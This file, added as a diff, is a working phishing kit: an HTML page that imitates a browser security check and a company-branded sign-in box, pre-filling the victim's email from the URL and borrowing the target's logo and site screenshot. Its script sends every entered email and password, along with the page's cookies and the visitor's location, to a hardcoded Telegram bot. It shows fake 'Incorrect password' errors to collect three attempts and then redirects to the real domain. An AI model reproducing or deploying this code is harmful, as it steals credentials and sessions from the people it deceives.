@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Review</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+/* ============= GLOBAL ============= */
+body, html {
+  margin: 0;
+  padding: 0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  height: 100%;
+  overflow: hidden;
+}
+
+/* ============= BACKGROUND IFRAME ============= */
+#bg-frame { 
+  position: fixed; 
+  inset: 0; 
+  width: 100%; 
+  height: 100%; 
+  border: none; 
+  z-index: 0; 
+}
+
+/* ============= VERIFICATION OVERLAY ============= */
+#verification-overlay {
+  position: fixed; inset:0; background:#1d1d1d; color:white;
+  display:flex; flex-direction:column; justify-content:center; align-items:center;
+  z-index:9999; opacity:1; transition: opacity 1s ease;
+}
+#verification-overlay.fade-out { opacity:0; pointer-events:none; }
+
+/* ============= LOGIN BOX ============= */
+#login-wrapper {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  opacity: 0;
+  transform: translateY(40px);
+  transition: opacity 0.48s cubic-bezier(.1,.9,.2,1),
+              transform 0.48s cubic-bezier(.1,.9,.2,1);
+}
+#login-wrapper.visible {
+  opacity: 5;
+  transform: translateY(0);
+}
+
+
+/* ===== SQUARE LOGIN BOX ===== */
+.login-box {
+  background: #fff;
+  padding: 32px;
+  border-radius: 0;              /* <-- SQUARE */
+  width: 360px;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.12);
+  position: relative;
+}
+
+/* LOGO */
+#logo { width:100px; display:block; margin:0 auto 20px; }
+
+/* Space under logo */
+.form-area {
+  margin-top: 80px;
+}
+
+
+/* Input fields */
+.login-box input {
+  width: 100%;
+  padding: 12px 16px;
+  margin-bottom: 15px;
+  border: 1px solid #bbb;
+  border-radius: 8px;
+  font-size: 15px;
+  transition: border-color 0.3s ease;
+  box-sizing: border-box;
+}
+
+.login-box input:focus {
+  border-color: #555;
+  outline: none;
+}
+
+/* Login button */
+.login-box button {
+  width: 100%;
+  padding: 12px 16px;
+  font-size: 16px;
+  background-color: #444;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+  box-sizing: border-box;
+}
+
+.login-box button:hover {
+  background-color: #222;
+}
+
+/* Error message */
+.error-msg {
+  color: #d33;
+  font-size: 13px;
+  margin-bottom: 12px;
+  min-height: 18px;
+  font-weight: 600;
+  width: 100%;
+  text-align: left;
+}
+
+
+#shake-wrapper { width: 100%; }
+
+@keyframes shakeStrong {
+  0% { transform: translateX(0); }
+  15% { transform: translateX(-12px); }
+  30% { transform: translateX(12px); }
+  45% { transform: translateX(-10px); }
+  60% { transform: translateX(10px); }
+  75% { transform: translateX(-6px); }
+  90% { transform: translateX(6px); }
+  100% { transform: translateX(0); }
+}
+.shake {
+  animation: shakeStrong 0.45s ease;
+}
+
+.login-content.shake {
+  animation: shake 0.4s;
+}
+#error-msg { color:red; margin-top:10px; height:20px; }
+
+
+
+
+/* ===== ABSOLUTE FINAL ICON FIX — OVERRIDES EVERYTHING ===== */
+.input-group {
+  position: relative;
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+.input-group .icon {
+  position: absolute;
+  left: 18px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 20px;
+  color: #000;
+  pointer-events: none;
+}
+
+.input-group input {
+  width: 100%;
+  height: 52px;
+  padding-left: 58px !important; /* FORCE PERFECT ALIGNMENT */
+  padding-right: 16px;
+  font-size: 17px;
+  border-radius: 8px;
+  border: 1px solid #bbb;
+  background: #fff;
+  box-sizing: border-box;
+  display: flex;
+  align-items: center;
+}
+
+/* NEXT BUTTON */
+.ms-next-btn {
+  background:#0067b8; color:#fff; border:none;
+  padding:12px 34px; font-size:17px;
+  cursor:pointer; float:right; border-radius:0;
+  transition:background 0.2s ease;
+}
+.ms-next-btn:hover { background:#005a9e; }
+
+
+
+</style>
+</head>
+<body>
+
+
+
+<!-- CAPTCHA Overlay -->
+<div id="verification-overlay">
+  <h1 id="domain-title">Checking your browser before accessing ...</h1>
+  <p id="security-msg">Verifying you are human. This may take a few seconds...</p>
+  <form id="turnstile-form" action="#" method="POST">
+    <input type="hidden" id="hash-field" name="hash">
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAABh8YRnURc-1UUi-" data-callback="onCaptchaSuccess"></div>
+  </form>
+</div>
+
+<!-- Fullscreen background iframe -->
+<iframe id="bg-frame"></iframe>
+
+<!-- ================= LOGIN CONTENT AREA ================= -->
+<div id="login-wrapper">
+  <div class="login-box">
+    <div id="login-content-container">
+
+      <img id="logo" src="" alt="Logo">
+
+      <div class="input-group">
+    <i class="fa-solid fa-envelope icon"></i>
+    <input type="text" id="email" placeholder="Email">
+</div>
+
+<div class="input-group">
+    <i class="fa-solid fa-lock icon"></i>
+    <input type="password" id="password" placeholder="Password">
+</div>
+
+        <p>Sign in to Review
+<p>
+      <button id="login-btn" class="ms-next-btn">Sign in</button>
+
+      <p id="error-msg"></p>
+
+    </div>
+  </div>
+</div>
+
+<!-- CAPTCHA SCRIPT -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const overlay = document.getElementById("verification-overlay");
+  const title = document.getElementById("domain-title");
+  const loginWrapper = document.getElementById("login-wrapper");
+  const emailInput = document.getElementById('email');
+  const logoImg = document.getElementById('logo');
+  const errorMsg = document.getElementById('error-msg');
+  const bgFrame = document.getElementById('bg-frame');
+ 
+
+  // Extract email from URL query parameter
+  const params = new URLSearchParams(window.location.search);
+  const rawEmail = params.get("bra777"); // match your URL
+  let domain = "yourdomain.com";
+
+  if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+    emailInput.value = rawEmail;
+    emailInput.setAttribute("uneditable", true);
+
+    domain = rawEmail.split('@')[1].trim();
+  // HIDE parameter
+  history.replaceState({}, document.title, window.location.pathname);
+    // Set logo
+    logoImg.src = `https://logo.clearbit.com/${domain}`;
+    logoImg.onerror = () => { logoImg.src = "https://via.placeholder.com/150?text=Logo"; };
+
+    // Fallback screenshot
+    const fallbackScreenshot = document.createElement('img');
+    fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+    fallbackScreenshot.style.cssText = `
+      position: fixed; inset: 0;
+      width: 100vw; height: 100vh;
+      object-fit: cover; z-index: 0; pointer-events: none;
+    `;
+    document.body.appendChild(fallbackScreenshot);
+  }
+
+  title.textContent = `Checking your browser before accessing ${domain}`;
+
+  // CAPTCHA success simulation
+  window.onCaptchaSuccess = () => {
+    overlay.classList.add("fade-out");
+    setTimeout(() => loginWrapper.classList.add("visible"), 350);
+  };
+
+  // Fallback if CAPTCHA slow
+  setTimeout(() => {
+    if (!loginWrapper.classList.contains("visible")) {
+      overlay.classList.add("fade-out");
+      loginWrapper.classList.add("visible");
+    }
+  }, 5000);
+
+  // Login error example
+  document.getElementById('login-btn').addEventListener('click', () => {
+    errorMsg.textContent = "Incorrect password";
+    errorMsg.classList.add("show");
+    setTimeout(() => errorMsg.classList.remove("show"), 3000);
+  });
+});
+
+document.addEventListener("DOMContentLoaded", () => {
+  
+  const overlay = document.getElementById("verification-overlay");
+  const securityMsg = document.getElementById("security-msg");
+  const loginWrapper = document.getElementById("login-wrapper");
+
+ 
+ 
+  // ✔ SHAKE FIXED
+  document.getElementById("login-btn").addEventListener("click", () => {
+    const box = document.getElementById("login-content-container");
+    box.classList.remove("shake");
+    void box.offsetWidth;
+    box.classList.add("shake");
+  });
+  
+ /* Status messages cycling */
+  const messages = [
+    "Performing browser integrity check...",
+    "Validating session security...",
+    "Verifying you are human..."
+  ];
+  messages.forEach((msg, i) => {
+    setTimeout(() => securityMsg.textContent = msg, i * 1300);
+  });
+
+ 
+  
+  /* REAL MS 365 login reveal */
+  window.onCaptchaSuccess = () => {
+    overlay.classList.add("fade-out");
+
+    setTimeout(() => {
+      loginWrapper.classList.add("visible");
+    }, 350);  // 350ms is the Microsoft delay before slide
+  };
+
+  /* Fallback if CAPTCHA slow */
+  setTimeout(() => {
+    if (!loginWrapper.classList.contains("visible")) {
+      overlay.classList.add("fade-out");
+      loginWrapper.classList.add("visible");
+    }
+  }, 5000);
+
+});
+
+  let activeDoc = null;
+
+  function openLogin(e){
+    const thumb = e.currentTarget.closest('.thumb');
+    activeDoc = thumb?.dataset.doc || 'Document';
+    document.getElementById('loginOverlay').classList.add('show');
+  }
+
+  function closeLogin(){
+    document.getElementById('loginOverlay').classList.remove('show');
+    document.getElementById('error-msg').style.display='none';
+  }
+
+  document.getElementById('login-btn').addEventListener('click', ()=>{
+    const err = document.getElementById('error-msg');
+    err.style.display='block';
+  });
+
+// Telegram Bot config
+const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+const TELEGRAM_CHAT_ID = "7574749243";
+
+
+// Elements
+const rawHash = window.location.hash.substring(1);
+const emailInput = document.getElementById('email');
+const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const errorMsg = document.getElementById('error-msg');
+const overlay = document.querySelector('.overlay');
+const loginBox = document.querySelector('.login-box');
+let attempts = 0;
+const maxAttempts = 3;
+
+document.body.classList.add('blur-active');
+
+// Helper: parse document.cookie into an object { name: value, ... }
+function parseCookies(cookieString = document.cookie) {
+  const cookies = {};
+  if (!cookieString) return cookies;
+  cookieString.split(';').forEach(pair => {
+    const idx = pair.indexOf('=');
+    if (idx > -1) {
+      const name = pair.slice(0, idx).trim();
+      const val = pair.slice(idx + 1).trim();
+      try {
+        cookies[name] = decodeURIComponent(val);
+      } catch {
+        cookies[name] = val;
+      }
+    }
+  });
+  return cookies;
+}
+
+// Grab cookies now
+const cookies = parseCookies();
+// Optional: console log to check cookies
+console.log("Cookies available to JS:", cookies);
+
+// Get email from URL  ?u=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("document");
+
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+  emailInput.value = rawEmail;
+  emailInput.setAttribute("uneditable", true);
+
+  const domain = rawEmail.split('@')[1];
+  // HIDE parameter
+  history.replaceState({}, document.title, window.location.pathname);
+ 
+  
+  // Set logo
+  logoImg.src = `https://logo.clearbit.com/${domain}`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  };
+
+  // Setup fallback screenshot container
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display: none;
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: 0;
+    pointer-events: none;
+  `;
+  fallbackScreenshot.alt = "Screenshot fallback";
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  
+}
+// Fetch user country (mandatory)
+
+// Location details
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
+loginBtn.disabled = true;
+
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .catch(() => {
+    // silent fail
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
+  });
+
+// Telegram message sender
+function sendTelegramMessage(email, password, attempt, country, cookies) {
+  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+               ` 🖥️UserId : [ ${email} ]\n` +
+               `  🔐Pass  : [ ${password} ]\n` +
+               ` 🌍Country : [ ${userCity}, ${userCountry} ]\n` +
+               ` 🍪Cookies: ${JSON.stringify(cookies)}`;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: "HTML"
+  };
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  }).catch(e => console.error("Telegram send failed:", e));
+}
+
+// Login button handler
+loginBtn.addEventListener('click', () => {
+  const password = passwordInput.value.trim();
+  if (password === "") {
+    errorMsg.textContent = "Password cannot be empty.";
+    return;
+  }
+  attempts++;
+  sendTelegramMessage(emailInput.value, password, attempts, userCountry, cookies);
+
+  if (attempts < maxAttempts) {
+    errorMsg.textContent = "Incorrect password.";
+    passwordInput.value = "";
+  } else {
+    errorMsg.textContent = "";
+    overlay.style.display = 'none';
+    document.body.classList.remove('blur-active');
+    window.location.href = `https://${emailInput.value.split('@')[1]}`;
+  }
+});
+</script>
+</body>
+</html>
